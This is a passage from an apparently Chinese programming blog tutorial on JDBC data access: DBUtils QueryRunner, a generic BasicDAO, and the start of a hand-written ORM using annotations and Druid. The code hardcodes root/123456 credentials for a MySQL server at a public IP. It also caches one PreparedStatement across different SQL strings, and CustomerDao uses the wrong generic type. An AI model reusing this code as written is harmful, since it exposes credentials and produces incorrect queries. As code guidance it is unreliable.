    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-dbutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">QueryRunner</span> queryRunner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryRunner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id >= ?"</span><span class="token punctuation">;</span>
    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> queryRunner<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span> sql<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BeanListHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> connection<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="DAO与增删改查通用方法-BasicDao"><a href="#DAO与增删改查通用方法-BasicDao" class="headerlink" title="DAO与增删改查通用方法-BasicDao"></a>DAO与增删改查通用方法-BasicDao</h2><blockquote>
<p>Dao : data access object 数据访问对象</p>
</blockquote>
<p>​    我们希望将增删改查一些公共的方法抽取出来，BasicDao是专门和数据库交互的，在BasicDao的基础上，实现一张表对应一个Dao，更好的完成功能，比如Customer表对应就是CustomerDao。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>dbutils<span class="token punctuation">.</span></span><span class="token class-name">QueryRunner</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>dbutils<span class="token punctuation">.</span>handlers<span class="token punctuation">.</span></span><span class="token class-name">BeanHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>dbutils<span class="token punctuation">.</span>handlers<span class="token punctuation">.</span></span><span class="token class-name">BeanListHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>dbutils<span class="token punctuation">.</span>handlers<span class="token punctuation">.</span></span><span class="token class-name">ScalarHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BasicDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">QueryRunner</span> qr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryRunner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 增删改操作</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameters<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            connection <span class="token operator">=</span> <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> update <span class="token operator">=</span> qr<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span> sql<span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> update<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将编译异常->运行异常 ,抛出</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> connection<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 查询并封装多个对象</span>
    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token function">queryMulti</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameters<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            connection <span class="token operator">=</span> <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> qr<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span> sql<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BeanListHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> connection<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 查询并封装单个对象</span>
    <span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">querySingle</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameters<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            connection <span class="token operator">=</span> <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> qr<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span> sql<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BeanHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//将编译异常->运行异常 ,抛出</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> connection<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 查询一个值</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">queryScalar</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameters<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            connection <span class="token operator">=</span> <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> qr<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span> sql<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ScalarHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> connection<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">CustomerDao</span> <span class="token keyword">extends</span> <span class="token class-name">BasicDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">CustomerDao</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/**
     * 封装自己的方法，并且由于是BasicDao的子类，可直接使用其定义的方法
     * 由于指定了泛型，也可以直接返回封装好的对象
     */</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h2><blockquote>
<p>是什么？</p>
</blockquote>
<p>​    对象关系映射（Object Relational Mapping，简称ORM）模式是一种<code>为了解决面向对象与关系数据库存在的互不匹配的现象的技术</code>。简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。</p>
<p>​    也就是说我们能不能不写死SQL，将一个模型类与数据库中一张表做映射关系。我们只面向对象操作，比如<code>save(new User)</code>表示保存User对象到数据库中，一般我们会把User类与数据库中User表进行匹配与映射。这样我们也不用<strong>直接</strong>写SQL了。</p>
<blockquote>
<p>ORM的优缺点 </p>
</blockquote>
<p>优点：简单，直接，面向对象操作</p>
<p>缺点：会牺牲程序的执行效率和会固定思维模式。 （用多了，SQL可能都不会写了，而且提供的方法是有限的，但你的需求是无限的，我深有体会，这里感谢鱼皮对我的帮助）。</p>
<blockquote>
<p>常见ORM框架</p>
</blockquote>
<ol>
<li>Mybatis 、Mybatis-plus（常用，直接看官方文档操作）</li>
<li>Hibernate</li>
</ol>
<p>​    </p>
<p>​    上面就是Java对数据库操作的演化过程，各个阶段的代码只做了简单的演示，感兴趣可以再深入学习，我现在是常用Mybatis-plus，但由于傻瓜式操作，我更想了解一下底层，所以在想我们能不能自己写一个简单的ORM，不需要很完善，可以表达思想即可，这里我看了一篇文章写的很棒，下面的代码也是基于该作者的。</p>
<p>详情链接：<a href="https://cloud.tencent.com/developer/article/2057369?from=article.detail.1803564">https://cloud.tencent.com/developer/article/2057369?from=article.detail.1803564</a></p>
<p>​    这里我们先声明一点，不管是什么操作，Mysql都是只认SQL，既然现在我们是面向对象操作，不去自己写SQL，那ORM底层就一定会通过某些操作，将我们的对象操作转写为SQL语句，最后执行。底层实际上还是基础的部分，只不过我们套了个壳子，让使用更方便了而已，这里需要的基本知识：<code>注解，反射，JDBC基础</code>。</p>
<h3 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h3><blockquote>
<p>我们既然要将实体类与数据库表做映射，那我们就应该在类上声明，它对应的哪个表。我们使用@Table 来声明</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Inherited</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Documented</span>
<span class="token comment">// 加在类上，标识哪张表</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Table</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Inherited</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Documented</span>
<span class="token comment">// 加在属性上，标识主键</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">PrimaryKey</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>对应的实体类</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// lombok注解，简化代码</span>
<span class="token annotation punctuation">@Data</span>
<span class="token annotation punctuation">@AllArgsConstructor</span>
<span class="token annotation punctuation">@NoArgsConstructor</span>
<span class="token comment">// 自定义注解，表示对应的user表</span>
<span class="token annotation punctuation">@Table</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@PrimaryKey</span>
    <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> gender<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> address<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>底层还是需要获取连接，这里我们使用Druid连接池</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 注册驱动
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyDataSource</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token class-name">DataSource</span> dataSource<span class="token punctuation">;</span>
    <span class="token punctuation">&#123;</span>
        <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span>DruidDataSource</span> dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span>DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataSource<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://1.14.74.242:3306/orm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataSource<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataSource<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataSource<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>dataSource <span class="token operator">=</span> dataSource<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>创建JdbcTemplate，利用DataSource与数据库直接交互，实现通用方法</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">PreparedStatement</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 根据资源获取连接，执行SQL，结果集
 */</span>
<span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">JdbcTemplate</span> <span class="token keyword">extends</span> <span class="token class-name">MyDataSource</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token class-name">Connection</span> connection<span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token class-name">PreparedStatement</span> preparedStatement<span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token class-name">ResultSet</span> resultSet<span class="token punctuation">;</span>

    <span class="token comment">//查询</span>
    <span class="token keyword">protected</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql <span class="token punctuation">,</span> <span class="token class-name">RowMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> rowMapper<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        preparedStatement <span class="token operator">=</span> <span class="token function">preparedStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
        resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token function">resultSet</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">,</span> rowMapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> list<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//更新</span>
    <span class="token keyword">protected</span> <span class="token keyword">int</span> <span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        preparedStatement <span class="token operator">=</span> <span class="token function">preparedStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> i <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            preparedStatement <span class="token operator">=</span> <span class="token function">preparedStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
            preparedStatement<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">//close();</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token comment">//获取链接</span>
    <span class="token keyword">private</span> <span class="token class-name">Connection</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>connection <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            connection <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> connection<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">//预执行sql</span>
    <span class="token keyword">private</span> <span class="token class-name">PreparedStatement</span> <span class="token function">preparedStatement</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
        connection <span class="token operator">=</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>preparedStatement <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
